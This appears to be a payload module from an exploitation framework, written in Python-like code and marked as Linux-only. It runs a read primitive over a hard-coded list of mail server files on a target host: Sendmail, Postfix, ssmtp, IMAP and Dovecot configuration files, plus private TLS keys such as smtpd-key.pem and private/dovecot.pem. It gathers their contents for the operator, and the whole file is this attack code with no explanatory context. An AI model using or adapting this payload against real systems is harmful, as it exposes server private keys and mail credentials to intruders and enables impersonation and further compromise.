#REQUIRE_LINUX
#This payload shows MAIL configuration files
result = []
files = []

files.append('/etc/mail/sendmail.cf')
files.append('/etc/mail/sendmail.mc')
files.append('/etc/postfix/main.cf')
files.append('/etc/postfix/master.cf')
files.append('/etc/ssmtp/ssmtp.conf')
files.append('/etc/ssmtp/revaliases')
files.append('/etc/mail/local-host-names')
files.append('/etc/mail/access')
files.append('/etc/imapd.conf')
files.append('/etc/dovecot.conf')
files.append('/etc/dovecot/dovecot.conf')

files.append('/usr/share/ssl/certs/dovecot.pem')
files.append('/usr/share/ssl/private/dovecot.pem')
files.append('/usr/share/ssl/certs/imapd.pem')
files.append('/etc/postfix/ssl/smtpd.pem')
files.append('/etc/postfix/ssl/smtpd-key.pem')


for file in files:
    if read(file) != '':
        result.append('-------------------------')
        result.append('FILE => '+file)
        result.append(read(file))

result = [p for p in result if p != '']
